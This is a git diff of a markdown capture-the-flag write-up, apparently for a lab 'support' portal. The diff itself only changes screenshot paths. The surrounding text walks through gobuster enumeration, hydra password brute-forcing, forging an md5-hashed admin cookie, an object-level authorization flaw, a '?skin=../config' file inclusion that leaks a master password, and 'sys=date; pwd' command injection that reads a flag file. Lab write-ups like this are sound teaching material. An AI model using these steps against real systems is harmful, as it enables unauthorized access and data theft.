@@ -38,7 +38,7 @@ gobuster dir -u http://<TARGET>/ \
   -b 403,404 \
   -o gobuster_results.txt
 ```
-![Gobuster Results](screenshots/1-gobuster-results.png)
+![Gobuster Results](screenshots/support/1-gobuster-results.png)
 <!-- Screenshot showing discovered endpoints: config.php, dashboard.php, api.php, /skins -->
 
 **Key lesson:** My first pass missed the `.php` extension flag entirely and found almost nothing. Adding `-x php` revealed the real endpoints. I also initially treated `/skins` as a dead end — re-enumerating *inside* that directory revealed `red.php`, `blue.php`, `green.php`, which later explained exactly how the `?skin=` LFI parameter mapped to files.
@@ -51,7 +51,7 @@ This was a goldmine of information:
 - `allow_url_fopen: On` → Local file access still possible
 - `session.use_strict_mode: Off` → Server accepts arbitrary session IDs
 
-![phpinfo() Page](screenshots/2-phpinfo-page.png)
+![phpinfo() Page](screenshots/support/2-phpinfo-page.png)
 <!-- Screenshot of phpinfo() showing the key configuration values -->
 
 ---
@@ -66,11 +66,11 @@ hydra -l help@support.thm -P /usr/share/wordlists/rockyou.txt \
   <TARGET> http-post-form \
   "/:email=^USER^&password=^PASS^:F=Invalid credentials" -t 4
 ```
-![Hydra Running](screenshots/3-hydra-bruteforce.png)
+![Hydra Running](screenshots/support/3-hydra-bruteforce.png)
 
 **Credentials Found:** `help@support.thm:snoopy`
 
-![Successful Login](screenshots/4-login-success.png)
+![Successful Login](screenshots/support/4-login-success.png)
 
 ---
 
@@ -84,7 +84,7 @@ for val in "true" "false" "yes" "no" "1" "0" "admin"; do
   echo -n "$val" | md5sum
 done
 ```
-![Cookie Inspection](screenshots/5-cookie-inspection.png)
+![Cookie Inspection](screenshots/support/5-cookie-inspection.png)
 
 **Result:**
 
@@ -93,8 +93,8 @@ md5("true") = b326b5062b2f0e69046810717534cb09 <- target value
 
 **Exploitation:** The application set `isITUser` to `md5("false")` by default for a regular logged-in user. Forging the cookie value to `b326b5062b2f0e69046810717534cb09` (`md5("true")`) unlocked the **IT Admin Panel**.
 
-![Forged Cookie](screenshots/6-forged-cookie.png)
-![IT Admin Panel](screenshots/7-admin-panel-revealed.png)
+![Forged Cookie](screenshots/support/6-forged-cookie.png)
+![IT Admin Panel](screenshots/support/7-admin-panel-revealed.png)
 
 **Vulnerability:** The application trusted a client-controlled hash with no server-side signature or validation mechanism — hashing a two-value input (`true`/`false`) provides no real security since the entire input space is trivially guessable.
 
@@ -108,13 +108,13 @@ The admin panel included an API endpoint `/user/{id}` that returned user informa
 ```json
 {"email": "help@support.thm", "2FA": false, "admin": false}
 ```
-![User ID 3 Response](screenshots/8-user-id-3.png)
+![User ID 3 Response](screenshots/support/8-user-id-3.png)
 
 **BOLA Exploitation (ID:1):**
 ```json
 {"email": "specialadmin@support.thm", "2FA": false, "admin": true}
 ```
-![User ID 1 Response](screenshots/9-user-id-1-bola.png)
+![User ID 1 Response](screenshots/support/9-user-id-1-bola.png)
 
 **Discovery:** An administrator account `specialadmin@support.thm` with elevated privileges exists, but credentials are unknown at this point.
 
@@ -136,7 +136,7 @@ A valid skin rendered an extra `<style>` block; an invalid one silently omitted 
 ```bash
 curl -s "http://<TARGET>/dashboard.php?skin=../config" -b "<cookies>"
 ```
-![LFI Request](screenshots/10-lfi-request.png)
+![LFI Request](screenshots/support/10-lfi-request.png)
 
 **Disclosed Source Code:**
 ```php
@@ -144,7 +144,7 @@ $MASTER_PASSWORD = 'support@110';
 $SITE_VER = '1.0';
 $SITE_NAME = 'support_portal';
 ```
-![Config.php Leaked](screenshots/11-config-leak.png)
+![Config.php Leaked](screenshots/support/11-config-leak.png)
 
 **Ruled out along the way:** Remote File Inclusion (blocked by `allow_url_include: Off`) and null-byte extension stripping (patched since PHP 5.3.4 — PHP 8 throws a hard error on embedded null bytes instead).
 
@@ -159,7 +159,7 @@ The disclosed `support@110` did not work directly against `specialadmin@support.
 echo "support@110" > base.txt
 john --wordlist=base.txt --rules:jumbo --stdout > mutated.txt
 ```
-![John Mutation](screenshots/12-john-mutation.png)
+![John Mutation](screenshots/support/12-john-mutation.png)
 
 **Second Brute Force:**
 ```bash
@@ -167,10 +167,10 @@ hydra -l specialadmin@support.thm -P mutated.txt \
   <TARGET> http-post-form \
   "/:email=^USER^&password=^PASS^:F=Invalid credentials" -t 4
 ```
-![Hydra Admin Brute Force](screenshots/13-admin-bruteforce.png)
+![Hydra Admin Brute Force](screenshots/support/13-admin-bruteforce.png)
 
 **Flag 1 Retrieved!** 🚩
-![Flag 1](screenshots/14-flag1.png)
+![Flag 1](screenshots/support/14-flag1.png)
 
 ---
 
@@ -183,14 +183,14 @@ As admin, a new Date/Time feature appeared in the footer, sending POST requests 
 sys=date; pwd
 
 **Response:** `/var/www/html` — command injection confirmed.
-![Command Injection Test](screenshots/15-command-injection-test.png)
+![Command Injection Test](screenshots/support/15-command-injection-test.png)
 
 **Flag Retrieval:**
 
 sys=date; cat /home/ubuntu/user.txt
 
 **Flag 2 Captured!** 🚩 `THM{GOT_THE_FLAG001}`
-![Flag 2](screenshots/16-flag2.png)
+![Flag 2](screenshots/support/16-flag2.png)
 
 ---
 
